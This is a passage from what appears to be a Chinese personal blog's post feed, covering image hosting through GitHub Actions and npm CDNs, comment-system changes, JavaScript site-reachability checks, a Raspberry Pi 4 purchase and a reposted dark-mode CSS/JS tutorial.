class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 